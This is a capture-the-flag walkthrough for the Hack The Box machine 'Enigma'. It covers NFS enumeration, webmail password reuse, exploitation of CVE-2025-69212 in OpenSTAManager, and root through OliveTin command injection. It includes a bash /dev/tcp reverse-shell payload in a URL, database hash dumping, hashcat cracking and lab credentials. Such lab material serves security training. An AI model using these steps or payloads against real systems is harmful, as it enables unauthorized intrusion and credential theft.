# Enigma - HTB Writeup

## Nmap Scan

Initial scan reveals the following open ports:

```text
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    nginx 1.24.0 (Ubuntu)
110/tcp  open  pop3    Dovecot pop3d
111/tcp  open  rpcbind 2-4 (RPC #100000)
143/tcp  open  imap    Dovecot imapd (Ubuntu)
993/tcp  open  imaps?
995/tcp  open  pop3s?
2049/tcp open  nfs_acl 3 (RPC #100227)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

---

# Enumerating NFS

Since **2049/tcp (NFS)** is exposed, enumerate exported shares.

```bash
showmount -e 10.129.27.25
```

Output:

```text
Export list for 10.129.27.25:
/srv/nfs/onboarding *
```

Mount the share:

```bash
mkdir /tmp/enigma_nfs
sudo mount -t nfs 10.129.27.25:/srv/nfs/onboarding /tmp/enigma_nfs -o nolock
ls -laR /tmp/enigma_nfs
```

Inside the share, a PDF contains the following credentials:

```text
Username: kevin
Password: Enigma2024!
```

---

# Accessing Webmail

Add the webmail host.

```text
10.129.27.25 mail001.enigma.htb
```

to `/etc/hosts`.

Browse to:

```
http://mail001.enigma.htb
```

Login using:

```text
Username: kevin
Password: Enigma2024!
```

Kevin has a welcome email mentioning that IT has placed additional credentials on the company shared drive.

Since we already mounted the shared drive, try reusing the same password for Sarah.

```text
Username: sarah
Password: Enigma2024!
```

Sarah's inbox contains IT credentials for OpenSTAManager.

```text
Subject: Re: OpenSTAManager Access Request
From: it@enigma.htb

URL: http://support_001.enigma.htb
Username: admin
Password: Ne3s4rtars78s
```

Add another host entry.

```text
10.129.27.25 support_001.enigma.htb
```

---

# OpenSTAManager

Browse to:

```
http://support_001.enigma.htb
```

Login with:

```text
Username: admin
Password: Ne3s4rtars78s
```

![](https://github.com/user-attachments/assets/24d7195c-f7cc-431b-938e-03d68288fe4d)

The version is displayed in the bottom-right corner.

![](https://github.com/user-attachments/assets/7a9b22a8-6da3-47af-9c2b-fb91a46fba8a)

Version:

```text
2.9.8
```

---

# CVE-2025-69212

The installed version is vulnerable to **CVE-2025-69212**.

The vulnerability exists in the **importFE_ZIP** plugin where filenames inside uploaded ZIP archives are concatenated into shell commands without sanitization, allowing arbitrary command execution.

Reference:

https://github.com/advisories/GHSA-25fp-8w8p-mx36

---

# Obtaining Database Credentials

Exploit the vulnerability to obtain a web shell.

From the web shell, inspect:

```text
/var/www/html/openstamanager/config.inc.php
```

![](https://github.com/user-attachments/assets/f7349851-1c2b-411b-9a35-fa8a2c245007)

Database credentials:

```text
Host: localhost
Database: openstamanager
Username: brollin
Password: Fri3nds@9099
```

---

# Reverse Shell

Trigger a reverse shell from the uploaded web shell.

```
http://support_001.enigma.htb/files/SHELL.php?c=bash+-c+'bash+-i+>%26+/dev/tcp/<YOUR_TUN0_IP>/<PORT>+0>%261'
```

Start a listener first.

```bash
nc -lvnp <PORT>
```

Once the shell connects, continue with database enumeration.

---

# Enumerating MySQL

List available tables.

```bash
mysql -u brollin -p'Fri3nds@9099' openstamanager -e "SHOW TABLES;"
```

![](https://github.com/user-attachments/assets/68c67c74-307e-449c-b425-55cac55bd8ed)

Dump usernames and password hashes.

```bash
mysql -u brollin -p'Fri3nds@9099' openstamanager -e "SELECT username,password FROM zz_users;"
```

![](https://github.com/user-attachments/assets/d15a96f0-fd35-4344-8e8b-479ac355d9d0)

---

# Cracking the Password Hash

Save Haris' hash into a file and crack it with Hashcat.

```bash
hashcat -m 3200 haris.hash rockyou.txt
```

![](https://github.com/user-attachments/assets/712df132-7613-40d2-9955-e409273d0e7e)

Recovered credentials:

```text
Username: haris
Password: bestfriends
```

Switch users.

```bash
su haris
```

Retrieve the user flag.

---

# Privilege Escalation - OliveTin

During enumeration, identify a root-owned OliveTin instance.

Process:

```text
/usr/local/bin/OliveTin
```

Runs as:

```text
root
```

Locate its configuration.

```text
/etc/OliveTin/config.yaml
```

Important configuration:

```yaml
listenAddressSingleHTTPFrontend: 127.0.0.1:1337

authRequireGuestsToLogin: false

defaultPermissions:
  view: true
  exec: true
  logs: true
```

This indicates the service is only accessible locally.

---

# SSH Port Forwarding

Forward the local OliveTin port.

```bash
ssh -L 1337:127.0.0.1:1337 haris@<TARGET_IP>
```

Browse to:

```
http://127.0.0.1:1337
```

---

# Root

Navigate to **Backup Database**.

Perform command injection in the **Password** field to execute commands as **root**, then read the root flag.
